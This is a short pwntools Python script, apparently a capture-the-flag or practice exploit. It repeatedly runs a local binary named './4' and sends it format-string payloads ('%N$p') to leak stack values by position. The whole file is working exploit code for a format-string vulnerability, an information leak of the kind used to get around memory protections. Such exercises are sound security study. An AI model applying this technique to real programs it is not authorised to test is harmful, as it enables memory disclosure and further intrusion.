from pwn import *

elf = context.binary = ELF('./4', checksec=False)

for i in range(1, 100):  # Adjust range as needed
    try:
        p = process(level='error')
        # payload = b"AAAA " #p64(0x7fffffffd9f0) # Place the address to read from
        payload = f"%{i}$p".encode() 
        # p.sendline('%{}$p'.format(i).encode())
        p.sendline(payload)
        result = p.recvall()
        print(str(i) + ': ' + str(bytes.fromhex(str(result[:3]))))
        p.close()
    except EOFError:
        pass